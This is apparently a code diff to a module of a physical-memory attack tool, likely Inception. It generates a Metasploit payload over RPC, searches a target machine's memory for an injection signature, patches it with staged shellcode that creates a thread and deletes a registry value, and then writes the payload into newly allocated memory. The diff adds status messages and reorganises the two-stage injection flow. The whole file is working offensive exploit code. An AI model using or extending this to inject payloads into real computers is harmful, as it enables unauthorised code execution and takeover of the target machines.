@@ -158,31 +158,6 @@ stage1 = Target(
         ]
     )
 
-# stage2 = {
-# 'x86': Target(
-#     name='Create and execute thread',
-#     note='Create a new thread with the MSF payload, execute it, restore ' \
-#          'stack and return to caller',
-#     signatures=[
-#         Signature(
-#             offsets=[0],
-#             chunks=[
-#                 Chunk(
-#                     chunk=0xffe0000000000000,
-#                     chunkoffset=0,
-#                     patch=shellcode['alloc_page'],
-#                     patchoffset=0)
-#                 ],
-#             os='Windows 7',
-#             os_versions=['SP0'],
-#             os_architectures=['x86'],
-#             executable='SearchIndexer.exe',
-#             version='',
-#             md5='',
-#             tag=False)
-#         ]),
-# 'x64': None}
-
 
 def add_options(group):
     group.add_option('--msfopts',
@@ -211,16 +186,17 @@ def set_opts(module, msfopts):
             module[opt] = useropts[opt]
 
 
-# def set_exitfunc(payload, exitfunk):
-#     '''
-#     Sets the exitfunc of a payload by manipulating the binary string
-#     '''
-#     pass  # TODO
+def set_exitfunc(payload, exitfunk):
+    '''
+    Sets the exitfunc of a payload by manipulating the binary string
+    '''
+    term.info('Overriding default MSF EXITFUNC, setting to \'thread\'')
+    pass  # TODO
 
 
 def run(opts, memspace):
 
-    # Connect to msf and generate shellcode(s)
+    # Connect to msf and generate shellcode
     try:
         client = MsfRpcClient(opts.msfpw)
     except MsfRpcError as e:
@@ -237,41 +213,31 @@ def run(opts, memspace):
         raise InceptionException('Could not get Metasploit payload: {0}'
                                  .format(e))
 
-    # term.poll('Options:')
-    # options = {'LHOST': 'localhost'}
-    #module['LHOST'] = '192.168.0.8'
-    # module['ForceEncode'] = False
-    # module['-t'] = 'raw'
-    # opts = {'ForceEncode': False}
-    # try:
-        
-    # except MsfRpcError as e:
-    #     term.fail(e)
-
     needed = [x for x in module.required if x not in module.advanced]
     term.info('Selected options:')
     for o in needed:
         term.info('{0}: {1}'.format(o, module[o]))
-    
-    # print(payload)
-    # print(util.bytes2hexstr(payload))
 
     # TODO: Allow users to set required options
 
-    # STAGE 1
+    # --- STAGE 1 ---
+    term.info('Searcing for injection point')
     address, signature, offset = memspace.find(stage1)
     
     # Signature found, let's patch
     term.found_at(address, memspace.page_no(address))
+    term.info('Patching at {0:#x}'.format(address))
     backup = memspace.patch(address, signature.chunks)
-    input()
-    # Figure out what os & architecture we're attacking and select stage
-    # TODO: For now, just select x86
-    # target = stage2[signature.os_architectures[0]]
 
+    # TODO: Figure out what os & architecture we're attacking and select stage
+    # TFor now, just select x86
+
+    # Wait to ensure initial stage execution
+    term.wait('Waiting to ensure initial stage execution', 5)
+    input()
     # TODO: Modify payload exitfunk that is used if the payload fails
 
-    # STAGE 2
+    # --- STAGE 2 ---
     # Concatenate shellcode and payload
     # payload = shellcode['create_thread'] + shellcode['edit_reg'] + payload
     payload = shellcode['create_thread'] + shellcode['reg_delete'] + payload
@@ -280,15 +246,18 @@ def run(opts, memspace):
     # This helps ensure that the process doesn't crash if the exploit fails
 
     # Write back original, backed up page
+    term.info('Restoring injection point memory')
     memspace.write(address, backup)
-    input()
     # Search for the newly allocated page with our signature
+    term.info('Searching for allocated page')
     address, signature, offset = memspace.rawfind(0, 0xffe0000000000000)
     # Signature found, let's patch
     term.found_at(address, memspace.page_no(address))
-    input()
+    term.info('Patching at {0:#x}'.format(address))
     memspace.write(address, payload)
 
+    term.info('Patch verified; successful')
+    term.info('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
     # Copy off original memory content in the region where stage 1 will be
     # written
 
